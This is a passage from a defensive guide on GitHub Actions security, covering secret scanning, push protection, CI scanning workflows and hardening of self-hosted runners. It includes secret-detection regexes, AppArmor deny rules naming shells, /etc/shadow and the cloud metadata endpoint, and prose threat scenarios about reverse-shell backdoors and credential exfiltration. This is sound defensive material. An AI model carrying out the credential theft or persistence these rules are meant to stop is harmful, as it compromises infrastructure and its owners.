3. Enable **Push protection** organization-wide
4. Configure **Custom patterns** for org-specific secrets

**Enforcement via API**:

```bash
#!/bin/bash
### enable-secret-scanning.sh
### Enable secret scanning and push protection for all org repos

ORG="your-org"
TOKEN="${GITHUB_TOKEN}"

### Get all repositories in organization
repos=$(gh api \
  --paginate \
  "/orgs/${ORG}/repos" \
  --jq '.[].name')

for repo in $repos; do
  echo "Enabling secret scanning for ${ORG}/${repo}..."

##  # Enable secret scanning
  gh api \
    --method PATCH \
    "/repos/${ORG}/${repo}" \
    -f security_and_analysis[secret_scanning][status]=enabled \
    -f security_and_analysis[secret_scanning_push_protection][status]=enabled

  echo "✓ ${repo} configured"
done
```

**Best Practices**:

- Enable organization-wide by default
- Require for all new repositories
- Audit compliance weekly
- Block repository creation without security features

#### Push Protection

Push protection blocks commits containing secrets before they reach GitHub.

##### How Push Protection Works

```mermaid
sequenceDiagram

%% Ghostty Hardcore Theme
    participant Dev as Developer
    participant Git as Git Client
    participant GH as GitHub
    participant Scan as Secret Scanner

    Dev->>Git: git push origin main
    Git->>GH: Push commit
    GH->>Scan: Scan commit contents

    alt Secret Detected
        Scan-->>GH: Secret found (API key pattern)
        GH-->>Git: ❌ Push rejected
        Git-->>Dev: Error: secret detected<br/>Remove secret and retry
    else No Secret
        Scan-->>GH: No secrets found
        GH-->>Git: ✓ Push accepted
        Git-->>Dev: Push successful
    end

```

##### Bypassing Push Protection

Developers can bypass push protection for false positives. Track bypasses for security review.

**Bypass Process**:

1. Developer attempts push with secret
2. GitHub blocks push with bypass option
3. Developer provides justification (false positive, test credential, will revoke)
4. Push allowed with bypass event logged
5. Security team reviews bypass audit trail

**Bypass Workflow**:

```bash
### Developer pushes commit with secret
git push origin main
### > Error: secret detected in commit abc123
### > To bypass, visit: https://github.com/org/repo/security/bypass/abc123

### Developer bypasses with justification
### GitHub logs bypass event

### Security team reviews bypasses
gh api /repos/org/repo/secret-scanning/push-protection-bypasses
```

**Monitor Bypasses**:

```yaml
### .github/workflows/monitor-bypasses.yml
### Alert security team when push protection bypassed

name: Monitor Push Protection Bypasses
on:
  schedule:
    - cron: '0 */4 * * *'  # Every 4 hours
  workflow_dispatch:

permissions:
  contents: read

jobs:
  check-bypasses:
    runs-on: ubuntu-latest
    steps:
      - name: Get recent bypasses
        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea  # v7.0.1
        with:
          script: |
            const bypasses = await github.paginate(
              github.rest.secretScanning.listPushProtectionBypasses,
              {
                owner: context.repo.owner,
                repo: context.repo.repo
              }
            );

            const recent = bypasses.filter(b => {
              const created = new Date(b.created_at);
              const fourHoursAgo = new Date(Date.now() - 4 * 60 * 60 * 1000);
              return created > fourHoursAgo;
            });

            if (recent.length > 0) {
              core.warning(`${recent.length} push protection bypasses in last 4 hours`);
              for (const bypass of recent) {
                core.warning(`Bypass by ${bypass.pusher.login}: ${bypass.token_type}`);
              }
              // Trigger alert to security team (Slack, PagerDuty, etc.)
            }
```

#### Custom Pattern Definitions

Define organization-specific secret patterns for internal credentials.

##### Creating Custom Patterns

Custom patterns use regular expressions to detect organization-specific secrets.

**Pattern Format**:

```regex
### Pattern components
(?i)                           # Case insensitive
\b                             # Word boundary
(internal_api_key|secret_key)  # Secret identifier
[\s:=]+                        # Separator
([a-f0-9]{64})                 # Secret value pattern
\b                             # Word boundary
```

**Organization-Level Pattern**:

1. Navigate to `Organization Settings → Code security → Secret scanning`
2. Click **New pattern**
3. Define pattern name and regular expression
4. Test against sample secrets
5. Enable for all or selected repositories

**Example Custom Patterns**:

| Secret Type | Pattern | Example Match |
| ----------- | ------- | ------------- |
| Internal API Key | `(?i)\b(internal_api_key\s*[:=]\s*)([a-f0-9]{64})\b` | `INTERNAL_API_KEY=a1b2c3d4...` |
| Service Token | `(?i)\bSVC_TOKEN_([A-Z0-9]{32})\b` | `SVC_TOKEN_AB12CD34EF56GH78...` |
| Database URL | `(?i)postgresql://[^:]+:[^@]+@[^/]+/\w+` | `postgresql://user:pass@host/db` |
| SSH Private Key | `-----BEGIN (RSA\|OPENSSH) PRIVATE KEY-----` | `-----BEGIN RSA PRIVATE KEY-----` |

##### Pattern Best Practices

**Effective Patterns**:

- Use word boundaries `\b` to avoid substring false positives
- Include secret identifier context (e.g., `API_KEY=`)
- Match actual secret format (length, character class)
- Test against real examples before deployment
- Document pattern purpose and maintenance owner

**Avoid Common Mistakes**:

- Too broad: `[a-z0-9]+` (matches everything)
- Too narrow: `PROD_KEY=abc123` (only matches one value)
- Missing boundaries: `password.*` (matches variable names)
- No context: `[a-f0-9]{64}` (many false positives)

**Test Pattern**:

```bash
### Test custom pattern against sample file
echo "INTERNAL_API_KEY=a1b2c3d4e5f6..." > test-secret.txt

### GitHub CLI test (pattern must be created first)
gh secret-scanning list --repo org/repo

### Local regex test
grep -P '(?i)\b(internal_api_key\s*[:=]\s*)([a-f0-9]{64})\b' test-secret.txt
```

#### Secret Scanning Alerts

Alerts notify repository administrators when secrets are detected.

##### Alert Triage Workflow

```mermaid
flowchart TD
    Alert["Secret Detected"] --> Verify["1. Verify Alert<br/>Real or False Positive?"]

    Verify -->|Real Secret| Classify["2. Classify Severity<br/>Production or Test?"]
    Verify -->|False Positive| Dismiss["Dismiss as<br/>False Positive"]

    Classify -->|Production Credential| Critical["🔴 CRITICAL<br/>Immediate Response"]
    Classify -->|Test/Dev Credential| Medium["🟡 MEDIUM<br/>Standard Response"]

    Critical --> Revoke1["3a. Revoke credential<br/>(within 15 minutes)"]
    Medium --> Revoke2["3b. Revoke credential<br/>(within 24 hours)"]

    Revoke1 --> Rotate1["4a. Rotate credential<br/>Update GitHub secret"]
    Revoke2 --> Rotate2["4b. Rotate credential<br/>Update GitHub secret"]

    Rotate1 --> Clean1["5a. Remove from history<br/>BFG Repo-Cleaner"]
    Rotate2 --> Clean2["5b. Remove from history<br/>Git filter-branch"]

    Clean1 --> Document1["6. Document incident"]
    Clean2 --> Document2["6. Document incident"]

    %% Ghostty Hardcore Theme
    style Alert fill:#66d9ef,color:#1b1d1e
    style Critical fill:#f92572,color:#1b1d1e
    style Medium fill:#e6db74,color:#1b1d1e
    style Dismiss fill:#75715e,color:#f8f8f2

```

### Security Scanning Workflows

Copy-paste ready security scanning workflow templates with comprehensive coverage. Each example demonstrates SAST with CodeQL, dependency vulnerability detection, container image scanning with Trivy, and SARIF upload to GitHub Security tab for centralized visibility.

> **Complete Security Patterns**
>
>
> These workflows integrate all security scanning patterns: SHA-pinned actions, minimal GITHUB_TOKEN permissions (`security-events: write` for SARIF upload), automated scanning on every PR and push, SARIF result aggregation in GitHub Security tab, and security gates that block merges on critical findings.
>

#### Security Scanning Principles

Every security scanning workflow in this guide implements these controls:

1. **SAST Integration**: Static analysis with CodeQL to detect code-level vulnerabilities
2. **Dependency Scanning**: Automated vulnerability detection in dependencies with severity-based gates
3. **Container Scanning**: Image vulnerability scanning with Trivy before deployment
4. **SARIF Upload**: Centralized findings in GitHub Security tab for audit and tracking
5. **Security Gates**: Block merges on critical/high severity findings
6. **Minimal Permissions**: `security-events: write` scoped to scanning jobs only
7. **Scan All Changes**: Automated scanning on every PR and main branch push

#### Universal Security Scanning Workflow

Comprehensive scanning workflow covering SAST, dependencies, and containers in one pipeline.

##### Multi-Scanner Security Pipeline

Complete security scanning with CodeQL, dependency review, and Trivy.

```yaml
name: Security Scanning
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]
  schedule:
##    # SECURITY: Weekly scheduled scan catches newly-disclosed vulnerabilities
##    # Run every Monday at 08:00 UTC
    - cron: '0 8 * * 1'

### SECURITY: Minimal permissions by default
permissions:
  contents: read

jobs:
##  # Job 1: SAST with CodeQL
  codeql-analysis:
    name: CodeQL SAST Analysis
    runs-on: ubuntu-latest
    permissions:
      contents: read        # Read repository code
      security-events: write  # Upload SARIF to Security tab
      actions: read         # Read workflow metadata
    strategy:
      fail-fast: false
      matrix:
##        # SECURITY: Scan all languages in monorepo
        language: ['javascript', 'python']
    steps:
##      # SECURITY: All actions pinned to full SHA-256 commit hashes
      - name: Checkout code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          persist-credentials: false

##      # SECURITY: Initialize CodeQL for static analysis
      - name: Initialize CodeQL
        uses: github/codeql-action/init@cdcdbb579706841c47f7063dda365e292e5cad7a  # v2.13.4
        with:
          languages: ${{ matrix.language }}
##          # SECURITY: security-extended includes additional checks beyond default suite
##          # Use security-and-quality for maximum coverage (slower)
          queries: security-extended
##          # SECURITY: Threat modeling configuration
##          # Identifies sources (user input) and sinks (sensitive operations)
          config-file: ./.github/codeql/codeql-config.yml

##      # SECURITY: Autobuild for compiled languages (Java, C++, C#, Go)
##      # For interpreted languages (JavaScript, Python), this is a no-op
      - name: Autobuild
        uses: github/codeql-action/autobuild@cdcdbb579706841c47f7063dda365e292e5cad7a  # v2.13.4

##      # SECURITY: Perform CodeQL analysis and upload results
      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@cdcdbb579706841c47f7063dda365e292e5cad7a  # v2.13.4
        with:
##          # SECURITY: Category allows multiple analyses per repository
##          # Use language as category for monorepo scanning
          category: "/language:${{ matrix.language }}"
##          # SECURITY: Upload SARIF to Security tab (requires security-events: write)
          upload: true
##          # SECURITY: Fail workflow on high/critical findings
##          # Comment out for informational-only scanning
##          # fail-on: high

##  # Job 2: Dependency vulnerability scanning
  dependency-scan:
    name: Dependency Vulnerability Scan
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write  # Post review comments on PRs
    steps:
      - name: Checkout code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          persist-credentials: false

##      # SECURITY: Dependency review detects vulnerable and malicious packages in PRs
##      # Only runs on pull_request events (not push)
      - name: Dependency Review
        if: github.event_name == 'pull_request'
        uses: actions/dependency-review-action@c74b580d73376b7750d3d2a50bfb8adc2c937507  # v3.1.0
        with:
##          # SECURITY: Fail on critical/high vulnerabilities
          fail-on-severity: high
##          # SECURITY: Deny licenses incompatible with your policy
          deny-licenses: AGPL-3.0, GPL-3.0
##          # SECURITY: Warn on moderate/low vulnerabilities
          warn-on-severity: moderate
##          # SECURITY: Comment threshold reduces PR noise
          comment-summary-in-pr: true
##          # SECURITY: Allow specific packages if needed (use sparingly)
##          # allow-dependencies-licenses: MIT, Apache-2.0

##  # Job 3: Container image vulnerability scanning
  container-scan:
    name: Container Image Scan
    runs-on: ubuntu-latest
##    # SECURITY: Only scan containers on main branch and PRs from same repo
##    # Prevents fork PRs from triggering container builds
    if: github.event_name == 'push' || github.event.pull_request.head.repo.full_name == github.repository
    permissions:
      contents: read
      security-events: write  # Upload SARIF to Security tab
    steps:
      - name: Checkout code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          persist-credentials: false

##      # SECURITY: Build container image for scanning
##      # In production, scan images from registry instead of building
      - name: Build container image
        run: |
          podman build -t myapp:${{ github.sha }} .

##      # SECURITY: Scan container image with Trivy
      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@d43c1f16c00cfd3978dde6c07f4bbcf9eb6993ca  # 0.16.1
        with:
##          # SECURITY: Scan filesystem and dependencies in container
          scan-type: 'image'
          image-ref: 'myapp:${{ github.sha }}'
##          # SECURITY: SARIF format for GitHub Security tab upload
          format: 'sarif'
          output: 'trivy-results.sarif'
##          # SECURITY: Fail on critical/high vulnerabilities
          severity: 'CRITICAL,HIGH'
##          # SECURITY: Exit code 1 if vulnerabilities found (blocks merge)
          exit-code: '1'
##          # SECURITY: Ignore unfixed vulnerabilities (optional)
##          # ignore-unfixed: true

##      # SECURITY: Upload Trivy results to Security tab
      - name: Upload Trivy SARIF results
        if: always()  # Upload even if scan fails
        uses: github/codeql-action/upload-sarif@cdcdbb579706841c47f7063dda365e292e5cad7a  # v2.13.4
        with:
          sarif_file: 'trivy-results.sarif'
##          # SECURITY: Category allows multiple scan results
          category: 'trivy-container'

##      # SECURITY: Also generate human-readable report
      - name: Generate Trivy report
        if: always()
        uses: aquasecurity/trivy-action@d43c1f16c00cfd3978dde6c07f4bbcf9eb6993ca  # 0.16.1
        with:
          scan-type: 'image'
          image-ref: 'myapp:${{ github.sha }}'
          format: 'table'
          output: 'trivy-report.txt'

      - name: Upload Trivy report
        if: always()
        uses: actions/upload-artifact@c7d193f32edcb7bfad88892161225aeda64e9392  # v4.0.0
        with:
          name: trivy-report
          path: trivy-report.txt
          retention-days: 30

##  # Job 4: Secret scanning verification
  secret-scan:
    name: Secret Scanning Verification
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Checkout code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
##          # SECURITY: Fetch full history to scan all commits in PR
          fetch-depth: 0
          persist-credentials: false

##      # SECURITY: Gitleaks scans for hardcoded secrets in commit history
      - name: Run gitleaks secret scan
        uses: gitleaks/gitleaks-action@cb7149a9c69f0f7c6a0c5b7b094889a91831ff7f  # v2.3.2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
##          # SECURITY: Don't expose findings in PR comments (use Security tab)
          GITLEAKS_ENABLE_COMMENTS: false
##          # SECURITY: Fail on secret detection
          GITLEAKS_ENABLE_UPLOAD_ARTIFACT: true
```

### Self-Hosted Runner Hardening

Hardening is not optional. Every layer of defense you skip is an attack vector you gift to adversaries. Deploy runners defensively or accept the breach.

> **The Default Is Insecure**
>
>
> A default runner installation has root access, unrestricted network, cloud metadata endpoints, persistent filesystem, and ambient credentials. One malicious workflow means full infrastructure compromise. Apply every hardening layer.
>

#### Hardening Strategy

Defense in depth. Assume every layer will fail. Combine multiple mitigations so that breaching one does not compromise the entire system.

```mermaid
flowchart LR
    A["Malicious Workflow"] --> B["OS Hardening"]
    B --> C["Network Isolation"]
    C --> D["Credential Protection"]
    D --> E["Audit Logging"]
    E --> F["Runtime Monitoring"]

    B -.->|"Bypass"| G["Attack Detected"]
    C -.->|"Bypass"| G
    D -.->|"Bypass"| G
    E -.->|"Bypass"| G
    F --> G

    G --> H["Automated Response"]

    %% Ghostty Hardcore Theme
    style A fill:#f92572,color:#1b1d1e
    style B fill:#a6e22e,color:#1b1d1e
    style C fill:#a6e22e,color:#1b1d1e
    style D fill:#a6e22e,color:#1b1d1e
    style E fill:#a6e22e,color:#1b1d1e
    style F fill:#a6e22e,color:#1b1d1e
    style G fill:#66d9ef,color:#1b1d1e
    style H fill:#e6db74,color:#1b1d1e

```

#### OS-Level Hardening

Harden the operating system before installing the runner. Every unnecessary service is an attack surface.

##### Base OS Configuration

###### Minimal Installation

Install only required packages. Eliminate unnecessary services that expand attack surface.

```bash
#!/bin/bash
### Minimal Ubuntu server hardening for GitHub Actions runner

set -euo pipefail

echo "==> Applying OS hardening for GitHub Actions runner"

### Remove unnecessary packages
apt-get purge -y \
  snapd \
  cloud-init \
  lxd \
  landscape-client \
  landscape-common \
  telnet \
  rsh-client \
  rsh-redone-client

### Remove package management tools that workflows should not use
apt-get purge -y apt-listchanges

### Update all packages
apt-get update
apt-get upgrade -y
apt-get autoremove -y

### Install security tools
apt-get install -y \
  unattended-upgrades \
  auditd \
  aide \
  fail2ban \
  ufw \
  apparmor \
  apparmor-utils

echo "==> OS hardening complete"
```

###### Automatic Security Updates

Enable unattended security updates to patch vulnerabilities automatically.

```bash
### /etc/apt/apt.conf.d/50unattended-upgrades
### Automatic security updates configuration

Unattended-Upgrade::Allowed-Origins {
    "${distro_id}:${distro_codename}-security";
    "${distro_id}ESMApps:${distro_codename}-apps-security";
    "${distro_id}ESM:${distro_codename}-infra-security";
};

Unattended-Upgrade::DevRelease "false";
Unattended-Upgrade::AutoFixInterruptedDpkg "true";
Unattended-Upgrade::MinimalSteps "true";
Unattended-Upgrade::Remove-Unused-Kernel-Packages "true";
Unattended-Upgrade::Remove-Unused-Dependencies "true";
Unattended-Upgrade::Automatic-Reboot "true";
Unattended-Upgrade::Automatic-Reboot-Time "03:00";
```

```bash
### /etc/apt/apt.conf.d/20auto-upgrades
### Enable automatic updates

APT::Periodic::Update-Package-Lists "1";
APT::Periodic::Download-Upgradeable-Packages "1";
APT::Periodic::AutocleanInterval "7";
APT::Periodic::Unattended-Upgrade "1";
```

###### CIS Benchmark Hardening

Apply Center for Internet Security (CIS) benchmarks for baseline hardening.

```bash
#!/bin/bash
### CIS Ubuntu Linux 22.04 LTS Benchmark Level 1 (selected controls)

set -euo pipefail

echo "==> Applying CIS benchmarks for runner hardening"

### 1.1.1.1 - Disable unused filesystems
cat > /etc/modprobe.d/disable-filesystems.conf <<EOF
install cramfs /bin/true
install freevxfs /bin/true
install jffs2 /bin/true
install hfs /bin/true
install hfsplus /bin/true
install udf /bin/true
EOF

### 1.5.1 - Configure bootloader permissions
chmod 600 /boot/grub/grub.cfg

### 3.1.1 - Disable IP forwarding (unless runner needs it)
cat >> /etc/sysctl.d/99-runner-hardening.conf <<EOF
net.ipv4.ip_forward = 0
net.ipv6.conf.all.forwarding = 0
EOF

### 3.2.1 - Disable packet redirect sending
cat >> /etc/sysctl.d/99-runner-hardening.conf <<EOF
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0
EOF

### 3.3.1 - Disable source routed packet acceptance
cat >> /etc/sysctl.d/99-runner-hardening.conf <<EOF
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0
net.ipv6.conf.all.accept_source_route = 0
net.ipv6.conf.default.accept_source_route = 0
EOF

### 3.3.2 - Disable ICMP redirect acceptance
cat >> /etc/sysctl.d/99-runner-hardening.conf <<EOF
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv6.conf.all.accept_redirects = 0
net.ipv6.conf.default.accept_redirects = 0
EOF

### 3.3.3 - Enable bad error message protection
cat >> /etc/sysctl.d/99-runner-hardening.conf <<EOF
net.ipv4.icmp_ignore_bogus_error_responses = 1
EOF

### 3.3.4 - Enable reverse path filtering
cat >> /etc/sysctl.d/99-runner-hardening.conf <<EOF
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1
EOF

### 3.3.5 - Enable TCP SYN cookies
cat >> /etc/sysctl.d/99-runner-hardening.conf <<EOF
net.ipv4.tcp_syncookies = 1
EOF

### Apply sysctl settings
sysctl -p /etc/sysctl.d/99-runner-hardening.conf

### 5.2.1 - Configure SSH server (if enabled)
if systemctl is-enabled ssh; then
    sed -i 's/^#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
    sed -i 's/^#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
    sed -i 's/^#PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
    systemctl restart ssh
fi

echo "==> CIS benchmark hardening complete"
```

##### User and Permission Hardening

Run the runner as a dedicated non-root user with minimal privileges.

###### Runner User Creation

```bash
#!/bin/bash
### Create dedicated runner user with minimal privileges

set -euo pipefail

RUNNER_USER="github-runner"
RUNNER_HOME="/opt/github-runner"

### Create runner user (system account, no shell, no password)
useradd \
  --system \
  --home-dir "$RUNNER_HOME" \
  --create-home \
  --shell /usr/sbin/nologin \
  --comment "GitHub Actions Runner" \
  "$RUNNER_USER"

### Lock the account (prevent password login)
passwd -l "$RUNNER_USER"

### Set restrictive permissions on runner home
chmod 750 "$RUNNER_HOME"
chown -R "$RUNNER_USER:$RUNNER_USER" "$RUNNER_HOME"

### Create workspace directory with isolation
mkdir -p "$RUNNER_HOME/_work"
chmod 700 "$RUNNER_HOME/_work"
chown "$RUNNER_USER:$RUNNER_USER" "$RUNNER_HOME/_work"

echo "==> Runner user created: $RUNNER_USER"
```

###### Sudo Restrictions

Never grant the runner user sudo access. If specific elevated operations are required, use targeted sudoers rules with command restrictions.

```bash
### /etc/sudoers.d/github-runner
### ONLY if specific commands require elevation (avoid if possible)

### Allow runner to restart specific service (example only)
github-runner ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart myapp.service

### Prevent everything else
github-runner ALL=(ALL) !ALL
```

**Best Practice**: Avoid sudo entirely. If workflows need privileged operations, redesign to use rootless containers or external services.

##### Filesystem Hardening

Restrict filesystem access to prevent malicious workflows from reading sensitive data or persisting backdoors.

###### Mount Options

Apply security-focused mount options to runner filesystems.

```bash
### /etc/fstab
### Restrictive mount options for runner workspace

### Example: Mount runner workspace with noexec, nosuid, nodev
tmpfs /opt/github-runner/_work tmpfs noexec,nosuid,nodev,size=8G,mode=0700,uid=github-runner,gid=github-runner 0 0

### Alternative: Dedicated partition for runner workspace
/dev/sdb1 /opt/github-runner/_work ext4 noexec,nosuid,nodev,noatime 0 2
```

**Mount options explained**:

- `noexec`: Prevent execution of binaries (malicious workflows cannot run compiled exploits)
- `nosuid`: Ignore setuid/setgid bits (prevent privilege escalation)
- `nodev`: Prevent device file creation (block device-based attacks)
- `noatime`: Disable access time updates (performance optimization)

###### AppArmor Profile

Confine the runner process with AppArmor mandatory access control.

```bash
### /etc/apparmor.d/github-runner
### AppArmor profile for GitHub Actions runner

#include <tunables/global>

/opt/github-runner/bin/Runner.Listener {
  #include <abstractions/base>
  #include <abstractions/nameservice>

##  # Runner binary and libraries
  /opt/github-runner/** r,
  /opt/github-runner/bin/Runner.Listener rix,

##  # Workspace access (read-write)
  /opt/github-runner/_work/** rw,

##  # Network access (required for GitHub API)
  network inet stream,
  network inet6 stream,

##  # Deny access to sensitive system paths
  deny /etc/shadow r,
  deny /root/** rw,
  deny /home/** rw,
  deny /var/log/** rw,

##  # Deny execution of shells (prevent interactive backdoors)
  deny /bin/bash x,
  deny /bin/sh x,
  deny /bin/dash x,

##  # Deny cloud metadata endpoints
  deny network inet to 169.254.169.254,
  deny network inet to fd00:ec2::254,
}
```

```bash
### Enable AppArmor profile
apparmor_parser -r /etc/apparmor.d/github-runner
aa-enforce /opt/github-runner/bin/Runner.Listener
```

#### Network Isolation

Isolate runners from production systems and restrict network access to required destinations only.

### Self-Hosted Runner Security Overview

Self-hosted runners put your infrastructure in the execution path. One compromised runner job means lateral movement into your network. Deploy defensively.

> **The Risk**
>
>
> Self-hosted runners execute untrusted code from pull requests and workflow files. Without proper isolation, a malicious workflow can escape the runner, persist in your network, exfiltrate data from adjacent systems, or pivot to production infrastructure.
>

#### Why Self-Hosted Runners Create Risk

GitHub-hosted runners are ephemeral virtual machines that GitHub manages. Self-hosted runners are machines you operate. The security model changes completely:

1. **Persistent State**: Runners retain data between jobs unless explicitly cleaned
2. **Network Access**: Runners can reach your internal networks and cloud resources
3. **Credential Exposure**: Cloud metadata endpoints, local credentials, adjacent services
4. **Supply Chain Target**: Attackers can plant backdoors for future jobs to exploit
5. **Compliance Boundary**: Your infrastructure, your responsibility for security posture

**Reality**: Most teams deploy self-hosted runners without hardening, network isolation, or ephemeral job isolation.

#### The Self-Hosted Runner Threat Model

```mermaid
flowchart TD
    A["Malicious Workflow"] --> B["Self-Hosted Runner"]

    B --> C["Attack Surface"]

    C --> D["Runner Filesystem"]
    C --> E["Network Access"]
    C --> F["Cloud Metadata"]
    C --> G["Adjacent Systems"]

    D --> D1["Persistent Backdoor"]
    D --> D2["Credential Theft"]
    D --> D3["Code Injection"]

    E --> E1["Internal Services"]
    E --> E2["Databases"]
    E --> E3["Production Systems"]

    F --> F1["Cloud IAM Tokens"]
    F --> F2["Instance Credentials"]

    G --> G1["Lateral Movement"]
    G --> G2["Data Exfiltration"]

    D1 --> H["Breach Outcomes"]
    D2 --> H
    E3 --> H
    F1 --> H
    G2 --> H

    H --> I["Production Compromise"]
    H --> J["Data Breach"]
    H --> K["Supply Chain Attack"]

    %% Ghostty Hardcore Theme
    style A fill:#f92572,color:#1b1d1e
    style B fill:#fd971e,color:#1b1d1e
    style C fill:#e6db74,color:#1b1d1e
    style H fill:#66d9ef,color:#1b1d1e
    style I fill:#f92572,color:#1b1d1e
    style J fill:#f92572,color:#1b1d1e
    style K fill:#f92572,color:#1b1d1e

```

#### GitHub-Hosted vs Self-Hosted Comparison

Understanding the security trade-offs between GitHub-hosted and self-hosted runners.

| Aspect | GitHub-Hosted | Self-Hosted |
| ------ | ------------- | ----------- |
| **Isolation Model** | Ephemeral VM per job | Persistent runner (unless hardened) |
| **Network Scope** | Internet-only | Access to internal networks |
| **Credential Exposure** | GITHUB_TOKEN only | Cloud metadata, local creds, adjacent services |
| **State Persistence** | None (clean VM each job) | Filesystem persists between jobs |
| **Security Responsibility** | GitHub manages hardening | You manage OS, network, isolation |
| **Update Management** | GitHub maintains runner software | You maintain OS and runner software |
| **Compliance Boundary** | GitHub's infrastructure | Your infrastructure and policies |
| **Cost Model** | Free for public repos, usage-based for private | Infrastructure + management overhead |
| **Attack Surface** | Minimal (isolated, ephemeral) | High (persistent, networked, adjacent systems) |

**Key Takeaway**: GitHub-hosted runners are secure by default. Self-hosted runners require deliberate hardening.

#### When to Use Self-Hosted Runners

Self-hosted runners introduce security risk. Only deploy them when specific requirements justify the operational burden.

##### Valid Use Cases

###### 1. Internal Network Access Required

- Deployment to on-premises systems
- Integration testing against internal services
- Database migrations requiring direct network access
- Legacy infrastructure without public endpoints

Risk Mitigation: Network segmentation, ephemeral runners, minimal network scope

###### 2. Hardware Requirements Exceeding GitHub-Hosted Limits

- Large memory workloads (GitHub-hosted max: 64GB)
- GPU-accelerated builds or testing
- Specialized CPU architectures (ARM, RISC-V)
- High-throughput disk I/O workloads

Risk Mitigation: Dedicated runner groups, workload-specific hardening

###### 3. Compliance Requirements for Data Locality

- Regulated industries requiring data residency (HIPAA, GDPR, FedRAMP)
- Customer data that cannot leave specific geographic regions
- Air-gapped environments for classified workloads

Risk Mitigation: Dedicated compliance-hardened infrastructure, audit logging

###### 4. Software Licensing Constraints

- Commercial tools licensed to specific machines
- Enterprise software requiring license server access
- Proprietary build toolchains tied to infrastructure

Risk Mitigation: License-dedicated runners with minimal scope

##### Invalid Use Cases (Use GitHub-Hosted Instead)

- **"Faster builds"**: GitHub-hosted runners are fast. Optimize your workflow first.
- **"Cost savings"**: Total cost of ownership (management overhead, security risk) typically exceeds GitHub-hosted costs
- **"Convenient access to cloud resources"**: Use OIDC federation to authenticate GitHub-hosted runners to cloud providers
- **"Need specific OS versions"**: GitHub provides Ubuntu, Windows, macOS with multiple versions
- **"Want persistent caches"**: Use `actions/cache` or artifact storage instead of filesystem persistence

#### Self-Hosted Runner Deployment Models

Choose a deployment model based on security requirements and operational constraints.

##### Model 1: Persistent Long-Lived Runners (Least Secure)

**Description**: Single runner process runs continuously on persistent VM or bare metal.

**Characteristics**:

- Filesystem state persists between jobs
- Network identity remains constant
- Runner software runs as long-lived service
- Same credentials available to all jobs

**Security Risk**: **High**

**When to Use**: Never for production workloads. Only for isolated internal testing.

**Attack Vectors**:

- Malicious job plants backdoor for future jobs to exploit
- Credential theft persists across job boundaries
- Network connections remain open for reconnaissance
- Filesystem poisoning affects subsequent builds

##### Model 2: Ephemeral VM-Based Runners (Better)

**Description**: Fresh VM provisioned for each job, destroyed after completion.

**Characteristics**:

- Clean state for every job
- Isolated network identity per job
- VM metadata provides per-job credentials
- No cross-job contamination

**Security Risk**: **Medium**

**When to Use**: Internal workloads requiring network access with strong isolation.

**Attack Vectors**:

- Job can still access cloud metadata endpoints
- Network access to internal systems during job execution
- VM provisioning overhead increases attack window

**Technologies**: Packer for VM images, cloud-init for bootstrapping, Actions Runner Controller (ARC) for orchestration

##### Model 3: Ephemeral Container-Based Runners (Best)

**Description**: Fresh container provisioned for each job, destroyed after completion.

**Characteristics**:

- Minimal attack surface (no systemd, limited binaries)
- Fast provisioning (seconds vs minutes for VMs)
- Network policies enforced at container level
- No access to cloud metadata without explicit configuration

**Security Risk**: **Low** (with proper hardening)

**When to Use**: Production workloads requiring self-hosted execution with strong security posture.

**Attack Vectors**:

- Container escape vulnerabilities (mitigate with gVisor, Kata Containers)
- Privileged container configurations (never use privileged mode)
- Shared kernel between containers (use VM-isolated containers for highest security)

**Technologies**: Podman for OCI containers, Kubernetes for orchestration, gVisor for container isolation

#### Runner Security Threat Scenarios

##### Scenario 1: Persistent Backdoor via Cron Job

**Timeline**:

- T+0: Malicious pull request workflow executes on persistent runner
- T+5m: Workflow installs reverse shell as cron job in runner's crontab
- T+1h: Workflow completes, PR closed as spam, no evidence in logs
- T+2h: Cron job executes, attacker gains interactive shell on runner
- T+4h: Attacker pivots to adjacent systems using runner's network access
- T+12h: Attacker exfiltrates database credentials from internal service
- T+24h: Production database breach detected, runner backdoor discovered

**Impact**: Full production compromise. Database exfiltration. Lateral movement across internal network.

**Prevention**: Ephemeral runners. Each job runs in fresh VM or container. No persistence between jobs.

##### Scenario 2: Cloud Metadata Credential Theft

**Timeline**:

- T+0: Pull request workflow from external contributor executes on self-hosted runner
- T+1m: Workflow queries cloud metadata endpoint for IAM credentials
- T+2m: Workflow exfiltrates AWS/GCP credentials to attacker-controlled server
- T+10m: Workflow completes normally, no suspicious behavior in logs
- T+1h: Attacker uses stolen credentials to create admin user in cloud account
- T+6h: Attacker deploys cryptominer across cloud infrastructure
- T+24h: Unusual cloud billing triggers investigation, breach discovered

**Impact**: Cloud account compromise. Unauthorized resource consumption. Potential data access.

**Prevention**: Network policies blocking metadata endpoints. Instance Metadata Service v2 (IMDSv2) requiring token headers. Ephemeral runners with minimal IAM permissions.

##### Scenario 3: Internal Network Reconnaissance

**Timeline**:

- T+0: External pull request workflow executes on runner with internal network access
- T+5m: Workflow performs port scan of internal network ranges
- T+15m: Workflow identifies database server on internal network
- T+20m: Workflow attempts default credentials against database
- T+25m: Workflow exfiltrates list of internal hostnames and open ports
